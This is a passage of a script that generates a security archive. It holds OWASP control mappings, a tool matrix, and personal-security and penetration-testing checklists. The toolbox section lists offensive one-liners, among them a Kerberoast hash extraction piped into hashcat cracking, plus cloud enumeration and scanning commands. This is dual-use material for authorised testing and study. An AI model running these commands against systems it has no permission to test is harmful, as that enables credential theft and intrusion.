4. Add the missing rule to `06-defense/` with a crosswalk row.
5. Update the CSV. The loop is the archive's most important quality mechanism.
'''.lstrip()

FILES["01-intel/cheat-sheets/owasp/index.md"] = r'''
# OWASP Cheat Sheet Series - Control Ingestion

| Field | Value |
|---|---|
| `catalog_id` | OWASP-CS |
| `source` | OWASP/CheatSheetSeries |
| `license` | CC-BY-SA-4.0 |
| `ingest` | `01-intel/cheat-sheets/owasp/owasp-controls.csv` |

## 1. Why a CSV and not just markdown

The upstream cheat sheets are prose. The archive needs them as **identifiable,
severity-bearing, detection-anchored rows** so that `06-defense/` can be proven
complete against them. `owasp-controls.csv` is that projection.

## 2. Column contract

| Column | Type | Notes |
|---|---|---|
| `control_id` | string | `<SHEET>-<N>`, e.g. `CSRF-2` |
| `sheet` | string | Upstream file slug |
| `title` | string | Control statement, trimmed to 120 chars |
| `severity` | enum | critical / high / medium / low / info |
| `cwe_id` | string | optional |
| `owasp_top10` | string | 2021 category |
| `anchor_layer` | enum | network / host / audit / application |
| `anchor_id` | string | sid, Wazuh rule id or sigma rule id |
| `provenance` | string | `OWASPCS@master@2026-01-14` |

## 3. Sheets ingested

| Sheet | Control prefix | Example control |
|---|---|---|
| Authentication | AUTH | AUTH-7 - generic error messages |
| Authorization | AUTHZ | AUTHZ-3 - enforce server-side checks |
| Session Management | SESSION | SESSION-4 - cookie attributes |
| Cross Site Request Forgery | CSRF | CSRF-2 - per-request token |
| Input Validation | INPUT | INPUT-4 - server-side validation |
| Injection Prevention | INJ | INJ-1 - parameterised queries |
| XSS Prevention | DOM | DOM-1 - context-aware output encoding |
| Deserialization | DES | DES-3 - cryptographic integrity |
| File Upload | UPL | UPL-2 - extension allow-list |
| Logging | LOG | LOG-4 - log injection prevention |
| Cryptographic Storage | CRYPTO | CRYPTO-1 - modern algorithms |
| Secrets Management | SECRETS | SECRETS-3 - rotation |
| REST Security | REST | REST-1 - HTTPS only |
| GraphQL | GQL | GQL-2 - introspection disabled in prod |
| LLM Prompt Injection | LLM | LLM-01 - segregate untrusted content |

## 4. Coverage rule

`ssactl verify --coverage` fails when any row has an empty `anchor_id`. Adding a
control without a detection is not allowed; adding a control *and* a rule is
the required unit of work.

## 5. Update procedure

```bash
# 1. refresh the upstream checkout pinned in the lock file
git -C .upstream/CheatSheetSeries pull
# 2. regenerate the CSV from the upstream markdown
python tools/ssactl.py index --root . --refresh-owasp
# 3. re-verify: new controls will appear as COV-001 failures until anchored
python tools/ssactl.py verify --root . --coverage
```
'''.lstrip()

FILES["01-intel/cheat-sheets/owasp/owasp-controls.csv"] = r'''
control_id,sheet,title,severity,cwe_id,owasp_top10,anchor_layer,anchor_id,provenance
CSRF-1,Cross_Site_Request_Forgery_Cheat_Sheet,Use anti-CSRF tokens for state-changing requests,critical,CWE-352,A01:2021,network,3001010,OWASPCS@master@2026-01-14
CSRF-2,Cross_Site_Request_Forgery_Cheat_Sheet,SameSite cookie attribute plus token validation,critical,CWE-352,A01:2021,host,86650,OWASPCS@master@2026-01-14
AUTH-1,Authentication_Cheat_Sheet,Multi-factor authentication on privileged paths,critical,CWE-308,A07:2021,host,86651,OWASPCS@master@2026-01-14
AUTH-2,Authentication_Cheat_Sheet,Server-side session store with strong identifiers,high,CWE-384,A07:2021,application,SESSION-2,OWASPCS@master@2026-01-14
AUTH-3,Authentication_Cheat_Sheet,Re-authenticate for sensitive operations,high,CWE-306,A07:2021,application,AUTH-3,OWASPCS@master@2026-01-14
AUTH-4,Authentication_Cheat_Sheet,Rate limit and lock out on failed logins,high,CWE-307,A07:2021,host,86630,OWASPCS@master@2026-01-14
AUTH-7,Authentication_Cheat_Sheet,Authentication error messages must be generic,high,CWE-209,A07:2021,audit,86652,OWASPCS@master@2026-01-14
AUTHZ-2,Authorization_Cheat_Sheet,Deny by default on every request,critical,CWE-863,A01:2021,application,AUTHZ-2,OWASPCS@master@2026-01-14
AUTHZ-3,Authorization_Cheat_Sheet,Server-side authorization on every data access,high,CWE-862,A01:2021,audit,86653,OWASPCS@master@2026-01-14
SESSION-3,Session_Management_Cheat_Sheet,Rotate session identifier after privilege change,high,CWE-384,A07:2021,audit,86654,OWASPCS@master@2026-01-14
SESSION-4,Session_Management_Cheat_Sheet,Set Secure HttpOnly SameSite on session cookies,high,CWE-1004,A07:2021,network,3001011,OWASPCS@master@2026-01-14
INPUT-4,Input_Validation_Cheat_Sheet,Server-side validation against an allow-list,high,CWE-20,A04:2021,network,3001001,OWASPCS@master@2026-01-14
INPUT-8,Input_Validation_Cheat_Sheet,Validate and sanitise URLs used for server-side requests,high,CWE-918,A10:2021,network,3001002,OWASPCS@master@2026-01-14
INJ-1,SQL_Injection_Cheat_Sheet,Use parameterised queries for every data access,critical,CWE-89,A03:2021,network,3001003,OWASPCS@master@2026-01-14
INJ-2,SQL_Injection_Cheat_Sheet,Use least privilege database accounts,high,CWE-284,A03:2021,audit,86655,OWASPCS@master@2026-01-14
DOM-1,XSS_Prevention_Cheat_Sheet,Context-aware output encoding at every sink,high,CWE-79,A03:2021,network,3001004,OWASPCS@master@2026-01-14
DOM-4,XSS_Prevention_Cheat_Sheet,Content Security Policy without unsafe-inline,high,CWE-1021,A05:2021,network,3001005,OWASPCS@master@2026-01-14
DES-3,Deserialization_Cheat_Sheet,Use cryptographic integrity for serialized data,medium,CWE-502,A08:2021,audit,86656,OWASPCS@master@2026-01-14
UPL-2,File_Upload_Cheat_Sheet,Allow-list extensions and set the filename server-side,high,CWE-434,A01:2021,host,86670,OWASPCS@master@2026-01-14
UPL-5,File_Upload_Cheat_Sheet,Store uploads outside the web root,high,CWE-434,A01:2021,network,3001006,OWASPCS@master@2026-01-14
LOG-4,Logging_Cheat_Sheet,Encode log data to prevent log injection,medium,CWE-117,A09:2021,host,86657,OWASPCS@master@2026-01-14
LOG-7,Logging_Cheat_Sheet,Alert on security events in near real time,medium,CWE-778,A09:2021,network,3001007,OWASPCS@master@2026-01-14
CRYPTO-1,Cryptographic_Storage_Cheat_Sheet,Use modern authenticated encryption,high,CWE-327,A02:2021,host,86658,OWASPCS@master@2026-01-14
CRYPTO-4,Cryptographic_Storage_Cheat_Sheet,Do not use ECB mode or static IV,high,CWE-327,A02:2021,host,86659,OWASPCS@master@2026-01-14
SECRETS-3,Secrets_Management_Cheat_Sheet,Rotate secrets on a schedule and on exposure,high,CWE-798,A07:2021,audit,86660,OWASPCS@master@2026-01-14
REST-1,REST_Security_Cheat_Sheet,Use HTTPS for all communications,high,CWE-319,A02:2021,network,3001008,OWASPCS@master@2026-01-14
REST-7,REST_Security_Cheat_Sheet,Validate Content-Type and reject unsupported media,medium,CWE-436,A04:2021,network,3001009,OWASPCS@master@2026-01-14
GQL-2,GraphQL_Cheat_Sheet,Disable introspection and batching in production,medium,CWE-200,A05:2021,network,3001012,OWASPCS@master@2026-01-14
GQL-4,GraphQL_Cheat_Sheet,Limit query depth and complexity,high,CWE-400,A05:2021,application,GQL-4,OWASPCS@master@2026-01-14
LLM-01,LLM_Prompt_Injection_Cheat_Sheet,Segregate untrusted content from instructions,critical,CWE-1427,A01:2021,application,SSA-LLM-01,OWASPCS@master@2026-01-14
LLM-02,LLM_Prompt_Injection_Cheat_Sheet,Validate and sanitise model output before use,high,CWE-1426,A02:2021,application,SSA-LLM-02,OWASPCS@master@2026-01-14
LLM-05,LLM_Prompt_Injection_Cheat_Sheet,Apply least privilege to data access tools given to models,high,CWE-250,A01:2021,audit,86661,OWASPCS@master@2026-01-14
'''.lstrip()

FILES["01-intel/cheat-sheets/book-of-secret-knowledge.md"] = r'''
# Book of Secret Knowledge - Operator Toolbox

| Field | Value |
|---|---|
| `cheat_id` | CS-BOSK |
| `source` | dmknght/BookOfSecretKnowledge |
| `license` | CC0-1.0 |

## 1. Tool matrix by phase

| Phase | Tool | Purpose | Archive link |
|---|---|---|---|
| Passive recon | `amass`, `subfinder`, `assetfinder` | subdomain discovery | `03-wordlists/discovery/dns/` |
| Passive recon | `theHarvester`, `h8mail` | emails and hosts | `05-engines/osint/` |
| Active recon | `nmap`, `masscan`, `naabu` | host/port mapping | `01-intel/playbooks/network/` |
| Web content | `ffuf`, `feroxbuster`, `gobuster`, `dirsearch` | fuzzing | `03-wordlists/web/fuzzing/` |
| Fuzzing | `ffuf` with `-mc` + unified index | payload-driven fuzzing | `10-crosswalk/wordlist-payload/` |
| Injection | `sqlmap`, `nosqlmap` | SQLi automation | `05-engines/sqlmap/` |
| Auth | `hydra`, `medusa`, `patator` | credential testing | `03-wordlists/credentials/` |
| JWT | `jwt_tool`, `hashcat -m 16500/16600` | token attacks | `02-payloads/api/` |
| AD | `BloodHound`, `CrackMapExec`, `Impacket` | graph and lateral | `01-intel/playbooks/active-directory/` |
| Cloud | `cloud_enum`, `prowler`, `trivy` | misconfiguration | `01-intel/playbooks/cloud/` |
| Forensics | `Volatility`, `ImHex`, `bulk_extractor` | memory/disk | `07-tooling/imhex/` |
| Data transform | `CyberChef` | decode/deobfuscate | `07-tooling/cyberchef/` |
| Reporting | `PlexTrac`, `Dradis`, `Ghostwriter` | evidence and findings | `14-docs/standards/` |

## 2. One-liners worth memorising

```bash
# find live hosts quickly
naabu -host targets.txt -silent | httpx -silent -title

# find hidden parameters
ffuf -u https://t/app -request -request-proto=GET -mc all -ac -recursion

# kerberoast + crack in one loop
Get-DomainUser -SPN | ForEach-Object { $_.SamAccountName } \
  | Invoke-Kerberoast -OutputFormat hashcat \
  | hashcat -m 13100 -w 3 hashes.txt /opt/wordlists/03-wordlists/credentials/rockyou-top10000.txt

# cloud storage enumeration
cloud_enum -k key.txt -k secret.txt -l | tee cloud-storage.txt

# find a secret in a repo
trufflehog git https://github.com/org/repo --since-commit 2020-01-01 --only-verified
```

## 3. Hardening references

* `06-defense/hardening/linux-baseline.md` - CIS-aligned Linux.
* `06-defense/hardening/windows-baseline.md` - Windows + AD.
* `06-defense/hardening/network-baseline.md` - switch/router/edge.
* `01-intel/checklists/personal-security-checklist.md` - individual baseline.

## 4. Anti-patterns

| Anti-pattern | Why it fails |
|---|---|
| Running every scanner at default settings | Noise, lockouts, blind spots |
| Trusting `nikto` output as a finding | Unvalidated, high false positive |
| Testing production with destructive payloads | Data loss, breach |
| Not recording evidence live | Unreconstructable report |
'''.lstrip()

FILES["01-intel/cheat-sheets/h4cker.md"] = r'''
# The Art of Hacking (h4cker) - Deep Curriculum Map

| Field | Value |
|---|---|
| `cheat_id` | CS-H4CKER |
| `source` | The-Art-of-Hacking/h4cker |
| `license` | GPL-3.0 |
| `role` | Depth-first technical curriculum for offensive engineers |

## 1. Curriculum → archive mapping

| h4cker pillar | Archive home | Depth |
|---|---|---|
| Networking deep dive | `01-intel/playbooks/network/` | packet to protocol |
| Operating systems internals | `04-evasion/`, `06-defense/hardening/` | syscalls, memory |
| Reverse engineering | `07-tooling/imhex/` | file format analysis |
| Web application security | `01-intel/playbooks/web/`, `02-payloads/` | full coverage |
| Binary exploitation | `01-intel/playbooks/os/` (via `02-payloads/os`) | memory corruption |
| Hardware / IoT | `09-labs/apps/` | firmware analysis |
| Cryptography | `01-intel/playbooks/crypto/` | practical misuse |
| Automation | `11-automation/`, `05-engines/` | at scale |

## 2. Study path

```
 Networking  ->  OS internals  ->  Reverse engineering  ->  Exploitation
      |                |                   |                    |
      v                v                   v                    v
 playbooks/       hardening/          tooling/imhex      payloads/os
      |                |                   |                    |
      +----------------+-------------------+--------------------+
                                       |
                                       v
                              ethics + governance (00-governance)
```

## 3. Self-hosted tooling pattern

h4cker ships small self-contained tools. The archive prefers wrapping them
behind a documented CLI contract in `11-automation/scripts/` so they can be
validated in CI, rather than vendoring opaque binaries.

| Tool | Contract |
|---|---|
| `sha1-crack` | `sha1-crack --hash <h> --wordlist <w> --stdout` |
| `zscan` | `zscan --range <cidr> --thread 50 --output json` |
| `http-header-check` | `http-header-check --url <u> --json` |
'''.lstrip()

FILES["01-intel/checklists/personal-security-checklist.md"] = r'''
# Personal Security Checklist

| Field | Value |
|---|---|
| `checklist_id` | CL-PSCL |
| `source` | 0xNaN/personal-security-checklist |
| `scope` | individual engineer and home lab |
| `maps_to` | `06-defense/hardening/` |

## 1. Account hygiene

- [ ] Password manager with a unique password per account (`06-defense/hardening/secrets-baseline.md`)
- [ ] Passkeys or TOTP MFA on email, password manager, Git, cloud, domain registrar
- [ ] Recovery codes stored offline, printed, in a safe
- [ ] Review account list quarterly; close what you no longer use
- [ ] Separate email aliases per service for breach blast-radius containment

## 2. Workstation

- [ ] Full-disk encryption (FileVault / BitLocker / LUKS)
- [ ] Automatic screen lock ≤ 5 min, lock on suspend
- [ ] Secure boot + TPM, BIOS/UEFI password
- [ ] Host firewall enabled (Windows Defender Firewall / `ufw` / `nftables`)
- [ ] Least-privilege daily account; no local admin
- [ ] Patch OS weekly, browser immediately
- [ ] `ssh` with key-only auth, `PasswordAuthentication no`

## 3. Developer environment

- [ ] Signed commits (`git config commit.gpgsign true`)
- [ ] `git config --global core.hooksPath .githooks`
- [ ] Dependency scanning: `npm audit`, `pip-audit`, `trivy fs`
- [ ] No secrets in `.env` committed - use a secret manager or `git-crypt`
- [ ] `pre-commit` with `gitleaks` / `trufflehog`
- [ ] Container images pinned by digest, minimal base images

## 4. Network and travel

- [ ] Home router firmware updated, default admin password changed
- [ ] WPA3 (or WPA2-AES), guest network for IoT, UPnP disabled
- [ ] VPN on untrusted Wi-Fi; verify no DNS leak
- [ ] Never plug unknown USB; data blocker on public charging
- [ ] Laptop screen privacy filter in public
- [ ] Disable auto-join on mobile; check for rogue Wi-Fi

## 5. Verification commands

```bash
# BitLocker / FileVault / LUKS
manage-bde status C:                      # Windows
diskutil apfs listCryptoUsers /           # macOS
lsblk -o NAME,TYPE,FSTYPE,MOUNTPOINT       # Linux (crypt device present)

# Firewall
Get-NetFirewallProfile | Select Name,Enabled          # Windows
sudo ufw status verbose                               # Linux

# SSH hardening
sshd -T | grep -E 'passwordauthentication|permitrootlogin|maxauthtries'

# Secret scan of the working tree
gitleaks detect --source . --no-banner
```

## 6. Breach response drill (run twice a year)

1. Check `https://haveibeenpwned.com` for your addresses.
2. Rotate every credential that appears in a new breach.
3. Revoke all active sessions on affected services.
4. Record what took time - that is the real finding.
'''.lstrip()

FILES["01-intel/checklists/penetration-testing-checklist.md"] = r'''
# Penetration Testing Checklist

Derived from `j0hnx3r/awesome-pentest` workflow + `meirwah/awesome-incident-response` discipline.

## 1. Pre-engagement

- [ ] Scope document signed: assets, exclusions, window, source IPs, contacts
- [ ] Emergency stop criteria agreed (data destruction, DoS, third-party data)
- [ ] Third-party assets identified and NOT tested
- [ ] Test accounts provided (never test with real user credentials)
- [ ] Backup verified by the client (you might need to restore)

## 2. Reconnaissance

- [ ] WHOIS, ASN, netblock ownership (`01-intel/cheat-sheets/book-of-secret-knowledge.md`)
- [ ] Passive DNS and CT log mining
- [ ] Subdomain enumeration (`03-wordlists/discovery/dns/`)
- [ ] Employee handles (`05-engines/osint/sherlock/`) - note ethics limits
- [ ] Content discovery (`03-wordlists/web/fuzzing/`)
- [ ] Git repository and backup file exposure (`.git`, `.bak`, `.swp`)

## 3. Vulnerability identification

- [ ] Port and service fingerprint (`01-intel/playbooks/network/service-enumeration.md`)
- [ ] Vulnerability scan with version cross-check
- [ ] Injection points on every parameter and header (`02-payloads/web/`)
- [ ] AuthN/AuthZ testing incl. horizontal/vertical privilege escalation
- [ ] Business logic abuse
- [ ] Configuration review against `06-defense/hardening/`
- [ ] Cloud storage permissions (`aws s3 ls` style)

## 4. Exploitation (prove, do not maximise)

- [ ] Prefer read-only proof over data extraction
- [ ] Never leave persistence on client production
- [ ] Document every command with output (evidence)
- [ ] Retest after remediation

## 5. Lateral movement and privilege escalation

- [ ] Document the full access path (`04-evasion/chains/abuse-chains.md`)
- [ ] Identify the escalation primitive ID (`EV-*`)
- [ ] Record the crown-jewel access, then stop

## 6. Reporting

- [ ] Findings with RAV score, evidence, reproduction, remediation
- [ ] Clean-up confirmed (test accounts removed, files deleted, no persistence)
- [ ] Retest scheduled
- [ ] Archive evidence per `00-governance/data-classification.md`

## 7. Deliverable template

```markdown
### SSA-<ENGAGEMENT>-F<n> - <title>
- Severity / RAV: <critical / high ...>  RAV=<n>
- Asset: <host/path>
- CWE / OWASP: CWE-89 / A03:2021
- Control mapping: INJ-1
- Evidence: <request/response, command + output>
- Reproduction: <numbered steps>
- Impact: <business impact, not just technical>
- Remediation: <specific, verifiable>
- Crosswalk: 10-crosswalk/attack-coverage/attack-coverage.csv
```
'''.lstrip()